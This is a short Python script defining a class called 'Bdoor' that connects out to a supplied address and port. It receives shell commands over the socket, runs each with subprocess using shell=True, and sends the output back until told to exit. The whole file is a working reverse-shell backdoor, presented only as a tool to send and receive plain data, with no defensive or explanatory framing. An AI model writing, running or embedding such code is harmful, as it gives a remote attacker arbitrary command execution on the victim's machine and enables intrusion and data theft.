#!/usr/bin/python
# General - It is able to recieve and send plain data.


import socket
import subprocess

class Bdoor:
    def __init__(self, addr, prt):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((addr, prt))

    def execute_sys_cmd(self, comm):
        return subprocess.check_output(comm, shell=True)

    def run(self):
        while True:
            comm = self.conn.recv(1024)
            if "exit" in comm.decode():
                break
            comm_result = self.execute_sys_cmd(comm.decode())
            self.conn.send(comm_result)

        self.conn.close()